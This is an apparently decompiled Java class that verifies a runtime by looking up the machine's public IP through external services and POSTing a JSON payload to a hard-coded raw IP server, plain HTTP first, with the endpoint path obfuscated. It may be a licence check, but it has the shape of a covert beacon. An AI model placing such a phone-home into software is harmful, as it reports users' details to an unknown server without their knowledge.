package studio.yukilem.yukilem.platform.runtime;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ThreadLocalRandom;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.json.JSONObject;

final class RuntimeVerifyHttp {
   private RuntimeVerifyHttp() {
   }

   @NotNull
   static String randomChallengeHex() {
      byte[] bs3 = new byte[32];
      ThreadLocalRandom threadLocalRandom5 = ThreadLocalRandom.current();
      byte[] bs2 = bs3;
      threadLocalRandom5.nextBytes(bs2);
      byte[] bs6 = bs3;
      return RuntimeFieldCodec.hex(bs6);
   }

   @NotNull
   static String resolvePublicIp() {
      String[] strings18 = new String[]{"https://api.ipify.org", "https://checkip.amazonaws.com", "https://ifconfig.me/ip"};
      String[] strings6 = strings18;
      String[] strings19 = strings6;
      String[] strings7 = strings19;
      String[] strings20 = strings7;
      int i8 = strings20.length;
      int i9 = 0;

      while (true) {
         int i23 = i9;
         int i75 = i8;
         if (i23 >= i75) {
            return "UNKNOWN";
         }

         String[] strings25 = strings7;
         int i76 = i9;
         String string10 = strings25[i76];
         HttpURLConnection httpURLConnection11 = null;

         label108: {
            String string16;
            label99: {
               label98: {
                  try {
                     try {
                        InputStream inputStream13;
                        label110: {
                           String string28 = string10;
                           httpURLConnection11 = (HttpURLConnection)URI.create(string28).toURL().openConnection();
                           HttpURLConnection httpURLConnection34 = httpURLConnection11;
                           httpURLConnection34.setRequestMethod("GET");
                           HttpURLConnection httpURLConnection35 = httpURLConnection11;
                           httpURLConnection35.setConnectTimeout(5000);
                           HttpURLConnection httpURLConnection36 = httpURLConnection11;
                           httpURLConnection36.setReadTimeout(5000);
                           HttpURLConnection httpURLConnection37 = httpURLConnection11;
                           httpURLConnection37.setRequestProperty("User-Agent", "AET/1.0");
                           HttpURLConnection httpURLConnection38 = httpURLConnection11;
                           inputStream13 = httpURLConnection38.getInputStream();

                           try {
                              InputStream inputStream4 = inputStream13;
                              Charset charset5 = StandardCharsets.UTF_8;
                              InputStreamReader inputStreamReader86 = new InputStreamReader(inputStream4, charset5);
                              BufferedReader bufferedReader40 = new BufferedReader(inputStreamReader86);
                              BufferedReader bufferedReader14 = bufferedReader40;

                              label84: {
                                 try {
                                    BufferedReader bufferedReader41 = bufferedReader14;
                                    String string15 = bufferedReader41.readLine();
                                    String string43 = string15;
                                    if (string43 != null) {
                                       String string44 = string15;
                                       string16 = string44.trim();
                                       break label84;
                                    }
                                 } catch (Throwable throwable96) {
                                    try {
                                       BufferedReader bufferedReader66 = bufferedReader14;
                                       bufferedReader66.close();
                                    } catch (Throwable throwable95) {
                                       throwable96.addSuppressed(throwable95);
                                    }

                                    throw throwable96;
                                 }

                                 BufferedReader bufferedReader70 = bufferedReader14;
                                 bufferedReader70.close();
                                 break label110;
                              }

                              BufferedReader bufferedReader46 = bufferedReader14;
                              bufferedReader46.close();
                           } catch (Throwable throwable97) {
                              InputStream inputStream60 = inputStream13;
                              if (inputStream60 != null) {
                                 try {
                                    InputStream inputStream61 = inputStream13;
                                    inputStream61.close();
                                 } catch (Throwable throwable94) {
                                    throwable97.addSuppressed(throwable94);
                                 }
                              }

                              throw throwable97;
                           }

                           InputStream inputStream47 = inputStream13;
                           if (inputStream47 != null) {
                              InputStream inputStream48 = inputStream13;
                              inputStream48.close();
                           }
                           break label99;
                        }

                        InputStream inputStream71 = inputStream13;
                        if (inputStream71 != null) {
                           InputStream inputStream72 = inputStream13;
                           inputStream72.close();
                        }
                        break label98;
                     } catch (Exception exception98) {
                     }
                  } catch (Throwable throwable99) {
                     HttpURLConnection httpURLConnection56 = httpURLConnection11;
                     if (httpURLConnection56 != null) {
                        HttpURLConnection httpURLConnection57 = httpURLConnection11;
                        httpURLConnection57.disconnect();
                     }

                     throw throwable99;
                  }

                  HttpURLConnection httpURLConnection53 = httpURLConnection11;
                  if (httpURLConnection53 != null) {
                     HttpURLConnection httpURLConnection54 = httpURLConnection11;
                     httpURLConnection54.disconnect();
                  }
                  break label108;
               }

               HttpURLConnection httpURLConnection73 = httpURLConnection11;
               if (httpURLConnection73 != null) {
                  HttpURLConnection httpURLConnection74 = httpURLConnection11;
                  httpURLConnection74.disconnect();
               }
               break label108;
            }

            HttpURLConnection httpURLConnection49 = httpURLConnection11;
            if (httpURLConnection49 != null) {
               HttpURLConnection httpURLConnection50 = httpURLConnection11;
               httpURLConnection50.disconnect();
            }

            return string16;
         }

         i9++;
      }
   }

   @Nullable
   static JSONObject postVerify(@NotNull JSONObject jsonObject0) {
      String string4 = "https://87.76.207.92:3000" + RuntimeFieldCodec.decode(RuntimeFieldCodec.EP_VERIFY);
      JSONObject jsonObject6 = postOnce("http://87.76.207.92:3000" + RuntimeFieldCodec.decode(RuntimeFieldCodec.EP_VERIFY), jsonObject0);
      JSONObject jsonObject14 = jsonObject6;
      if (jsonObject14 != null) {
         return jsonObject6;
      }

      String string15 = string4;
      return postOnce(string15, jsonObject0);
   }

   @Nullable
   private static JSONObject postOnce(@NotNull String string0, @NotNull JSONObject jsonObject1) {
      HttpURLConnection httpURLConnection8 = null;

      label123: {
         label124: {
            label125: {
               JSONObject jsonObject16;
               try {
                  try {
                     BufferedReader bufferedReader106;
                     label129: {
                        httpURLConnection8 = (HttpURLConnection)URI.create(string0).toURL().openConnection();
                        HttpURLConnection httpURLConnection24 = httpURLConnection8;
                        httpURLConnection24.setRequestMethod("POST");
                        HttpURLConnection httpURLConnection25 = httpURLConnection8;
                        httpURLConnection25.setRequestProperty("Content-Type", "application/json");
                        HttpURLConnection httpURLConnection26 = httpURLConnection8;
                        httpURLConnection26.setRequestProperty("User-Agent", "AET/1.0");
                        HttpURLConnection httpURLConnection27 = httpURLConnection8;
                        httpURLConnection27.setConnectTimeout(4000);
                        HttpURLConnection httpURLConnection28 = httpURLConnection8;
                        httpURLConnection28.setReadTimeout(8000);
                        HttpURLConnection httpURLConnection29 = httpURLConnection8;
                        httpURLConnection29.setDoOutput(true);
                        String string31 = jsonObject1.toString();
                        Charset charset92 = StandardCharsets.UTF_8;
                        byte[] bs10 = string31.getBytes(charset92);
                        HttpURLConnection httpURLConnection33 = httpURLConnection8;
                        OutputStream outputStream11 = httpURLConnection33.getOutputStream();

                        try {
                           OutputStream outputStream35 = outputStream11;
                           byte[] bs93 = bs10;
                           outputStream35.write(bs93);
                        } catch (Throwable throwable112) {
                           OutputStream outputStream82 = outputStream11;
                           if (outputStream82 != null) {
                              try {
                                 OutputStream outputStream83 = outputStream11;
                                 outputStream83.close();
                              } catch (Throwable throwable111) {
                                 throwable112.addSuppressed(throwable111);
                              }
                           }

                           throw throwable112;
                        }

                        OutputStream outputStream36 = outputStream11;
                        if (outputStream36 != null) {
                           OutputStream outputStream37 = outputStream11;
                           outputStream37.close();
                        }

                        HttpURLConnection httpURLConnection38 = httpURLConnection8;
                        InputStream inputStream80;
                        if (httpURLConnection38.getResponseCode() >= 400) {
                           HttpURLConnection httpURLConnection79 = httpURLConnection8;
                           inputStream80 = httpURLConnection79.getErrorStream();
                        } else {
                           HttpURLConnection httpURLConnection41 = httpURLConnection8;
                           inputStream80 = httpURLConnection41.getInputStream();
                        }

                        InputStream inputStream12 = inputStream80;
                        InputStream inputStream42 = inputStream12;
                        if (inputStream42 == null) {
                           break label124;
                        }

                        InputStream inputStream6 = inputStream12;
                        Charset charset7 = StandardCharsets.UTF_8;
                        InputStreamReader inputStreamReader99 = new InputStreamReader(inputStream6, charset7);
                        BufferedReader bufferedReader56 = new BufferedReader(inputStreamReader99);
                        bufferedReader106 = bufferedReader56;

                        try {
                           StringBuilder stringBuilder14 = new StringBuilder();

                           while (true) {
                              BufferedReader bufferedReader58 = bufferedReader106;
                              String string59 = bufferedReader58.readLine();
                              String string15 = string59;
                              if (string59 == null) {
                                 StringBuilder stringBuilder67 = stringBuilder14;
                                 if (stringBuilder67.length() != 0) {
                                    StringBuilder stringBuilder100 = stringBuilder14;
                                    String string101 = stringBuilder100.toString();
                                    JSONObject jsonObject69 = new JSONObject(string101);
                                    jsonObject16 = jsonObject69;
                                    break label129;
                                 }
                                 break;
                              }

                              StringBuilder stringBuilder60 = stringBuilder14;
                              String string95 = string15;
                              StringBuilder stringBuilder61 = stringBuilder60.append(string95);
                           }
                        } catch (Throwable throwable113) {
                           try {
                              BufferedReader bufferedReader63 = bufferedReader106;
                              bufferedReader63.close();
                           } catch (Throwable throwable110) {
                              throwable113.addSuppressed(throwable110);
                           }

                           throw throwable113;
                        }

                        BufferedReader bufferedReader75 = bufferedReader106;
                        bufferedReader75.close();
                        break label125;
                     }

                     BufferedReader bufferedReader70 = bufferedReader106;
                     bufferedReader70.close();
                  } catch (Exception exception114) {
                     break label123;
                  }
               } catch (Throwable throwable115) {
                  HttpURLConnection httpURLConnection50 = httpURLConnection8;
                  if (httpURLConnection50 != null) {
                     HttpURLConnection httpURLConnection51 = httpURLConnection8;
                     httpURLConnection51.disconnect();
                  }

                  throw throwable115;
               }

               HttpURLConnection httpURLConnection71 = httpURLConnection8;
               if (httpURLConnection71 != null) {
                  HttpURLConnection httpURLConnection72 = httpURLConnection8;
                  httpURLConnection72.disconnect();
               }

               return jsonObject16;
            }

            HttpURLConnection httpURLConnection76 = httpURLConnection8;
            if (httpURLConnection76 != null) {
               HttpURLConnection httpURLConnection77 = httpURLConnection8;
               httpURLConnection77.disconnect();
            }

            return null;
         }

         HttpURLConnection httpURLConnection44 = httpURLConnection8;
         if (httpURLConnection44 != null) {
            HttpURLConnection httpURLConnection45 = httpURLConnection8;
            httpURLConnection45.disconnect();
         }

         return null;
      }

      HttpURLConnection httpURLConnection53 = httpURLConnection8;
      if (httpURLConnection53 != null) {
         HttpURLConnection httpURLConnection54 = httpURLConnection8;
         httpURLConnection54.disconnect();
      }

      return null;
   }
}
